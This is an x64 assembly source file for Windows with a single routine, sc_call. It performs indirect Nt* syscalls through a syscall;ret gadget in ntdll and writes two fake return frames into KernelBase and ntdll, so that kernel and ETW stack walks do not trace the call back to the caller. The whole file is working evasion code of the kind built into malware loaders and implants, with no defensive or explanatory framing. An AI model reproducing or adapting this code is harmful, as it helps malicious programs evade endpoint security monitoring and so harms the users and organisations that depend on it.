/*
 * sc_call(ssn, a1..a11) — indirect syscall with 2-frame call-stack spoofing.
 *
 * On entry (Windows x64 ABI):
 *   rcx        = ssn   (uint16_t syscall number)
 *   rdx        = a1    (1st Nt* arg)
 *   r8         = a2
 *   r9         = a3
 *   [rsp+0x28] = a4
 *   [rsp+0x30] = a5
 *   [rsp+0x38] = a6
 *   [rsp+0x40] = a7
 *   [rsp+0x48] = a8
 *   [rsp+0x50] = a9
 *   [rsp+0x58] = a10
 *   [rsp+0x60] = a11
 *
 * Stack layout after jmp (what the kernel / ETW stack walk sees):
 *   [rsp+0x00] = sc_frame1  (ret in KernelBase .text — inner spoof frame)
 *   [rsp+0x08] = sc_frame2  (ret in ntdll .text     — outer spoof frame)
 *   [rsp+0x10] = original return address back to our code
 *
 * Nt* ABI remapping performed:
 *   rax = SSN, r10 = a1, rdx = a2, r8 = a3, r9 = a4
 *   [rsp+0x28..0x58] = a5..a11
 */

    .text
    .extern sc_gadget
    .extern sc_frame1
    .extern sc_frame2

    .global sc_call
sc_call:
    /* Pre-save a5/a6 before touching the stack — their positions shift after subq */
    movq    0x30(%rsp), %r10
    movq    0x38(%rsp), %r11

    /* Grow stack by 16 bytes: make room for 2 fake return addresses */
    subq    $0x10, %rsp

    /* Write spoof frames at the new top of stack */
    movq    sc_frame2(%rip), %rax
    movq    %rax, 0x08(%rsp)    /* outer frame: ntdll ret gadget     */
    movq    sc_frame1(%rip), %rax
    movq    %rax, 0x00(%rsp)    /* inner frame: KernelBase ret gadget */

    /* Store a5/a6 at their final positions ([rsp+0x28], [rsp+0x30]) */
    movq    %r10, 0x28(%rsp)
    movq    %r11, 0x30(%rsp)

    /* Remap args to Nt* ABI: r10=a1, rdx=a2, r8=a3, r9=a4 */
    movq    %rdx, %r10
    movq    %r8,  %rdx
    movq    %r9,  %r8
    movq    0x38(%rsp), %r9

    /* Shift a7..a11 down by 0x10 into their final stack positions */
    movq    0x50(%rsp), %r11 ;  movq    %r11, 0x38(%rsp)
    movq    0x58(%rsp), %r11 ;  movq    %r11, 0x40(%rsp)
    movq    0x60(%rsp), %r11 ;  movq    %r11, 0x48(%rsp)
    movq    0x68(%rsp), %r11 ;  movq    %r11, 0x50(%rsp)
    movq    0x70(%rsp), %r11 ;  movq    %r11, 0x58(%rsp)

    /* Load SSN into eax (lower 16 bits of rcx) */
    movzwl  %cx, %eax

    /* Indirect jump: execute syscall;ret inside ntdll — not our code */
    jmpq    *sc_gadget(%rip)
